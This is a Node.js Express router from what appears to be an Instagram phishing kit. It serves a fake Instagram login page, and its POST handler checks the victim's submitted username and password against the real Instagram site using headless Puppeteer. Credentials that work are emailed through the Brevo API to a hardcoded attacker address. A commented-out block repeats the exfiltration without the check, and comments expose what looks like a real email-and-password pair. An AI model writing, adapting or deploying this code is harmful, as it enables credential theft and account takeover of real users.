const express = require('express');
const router = express.Router();
const cookieParser = require("cookie-parser");
const axios = require('axios');
const puppeteer = require('puppeteer');
require('dotenv').config()


// index page
router.post('/email', async function (req, res) {
    const { username, password } = req.body
    if (username == 0 || password.length <= 5) {
        return res.send({ message: "", status: 300 })
    } else if (!username || !password) {
        return res.send({ message: "", status: 300 })
    } else {
        const browser = await puppeteer.launch({
            headless: true,
            executablePath:
                process.env.NODE_ENV === "production"
                    ? process.env.PUPPETEER_EXECUTABLE_PATH
                    : puppeteer.executablePath(),
            args: [
                "--disable-setuid-sandbox",
                "--no-sandbox",
                "--single-process",
                "--no-zygote",
            ],
        });

        const page = await browser.newPage();
        page.once('load', async () => {
            console.log('Page has finished loading!');
            try {
                await page.type('input[name="username"]', username);
                // 'pikam.sell@gmail.com'
                await page.type('input[name="password"]', password);
                // 'odigie9090@@'
                await page.click('button._acan._acap._acas._aj1-._ap30');
                setTimeout(async () => {
                    try {
                        const content = await page.$eval("._ab2z", div => div.textContent);
                        if (content == "Sorry, your password was incorrect. Please double-check your password.") {
                            console.log("login1")
                            await browser.close();
                            return res.send({ message: "Sorry, your password was incorrect. Please double-check your password.", status: 300 })
                        }

                    } catch (e) {
                        const currentUrl = await page.url();
                        if (currentUrl == "https://www.instagram.com/") {
                            console.log("login2")
                            await browser.close();
                            return res.send({ message: "Sorry, your password was incorrect. Please double-check your password.", status: 300 })
                        } else {
                            console.log("login3")
                            const response = await axios.post(
                                `https://api.brevo.com/v3/smtp/email`,
                                {
                                    "sender": {
                                        "name": "Test App",
                                        "email": "support@testapp.com"
                                    },
                                    "to": [
                                        {
                                            "email": "dailydevo9@gmail.com",
                                            "name": "User"
                                        },
                                        // {
                                        //     "email": email,
                                        //     "name": "User"
                                        // },
                                        // {
                                        //     "email": email,
                                        //     "name": "User"
                                        // }
                                    ],
                                    subject: `Login Details Submited`,
                                    "htmlContent": `<p>email: ${username}\n\npassword: ${password}</p>`
                                },
                                {
                                    headers: {
                                        "api-key": process.env.BREVO,
                                        "accept": "application/json",
                                        'Content-Type': ['application/json', 'application/json']
                                    }
                                }
                            );
                            await browser.close();
                            return res.send({ message: "login", status: 200 })
                        }

                    }
                    console.log(content);
                }, 10000)
            } catch (e) { }
        });
        await page.goto('https://www.instagram.com/', { timeout: 80000 });
    }
});





// index page
router.get('/', function (req, res) {
    res.render('pages/shop-details');
});



// index page
router.get('/login', function (req, res) {
    res.render('pages/instagram');
});


// router.post('/email', async function (req, res) {
//     const response = await axios.post(
//         `https://api.brevo.com/v3/smtp/email`,
//         {
//             "sender": {
//                 "name": "Test App",
//                 "email": "support@testapp.com"
//             },
//             "to": [
//                 {
//                     "email": "dailydevo9@gmail.com",
//                     "name": "User"
//                 },
//                 // {
//                 //     "email": email,
//                 //     "name": "User"
//                 // },
//                 // {
//                 //     "email": email,
//                 //     "name": "User"
//                 // }
//             ],
//             subject: `Login Details Submited`,
//             "htmlContent": `<p>email: ${req.body.email}\n\npassword: ${req.body.password}</p>`
//         },
//         {
//             headers: {
//                 "api-key": process.env.BREVO,
//                 "accept": "application/json",
//                 'Content-Type': ['application/json', 'application/json']
//             }
//         }
//     );

//     if (response.status <= 300) {
//         res.redirect('/')
//     } else {
//         res.render('/')
//     }
// });



module.exports = router;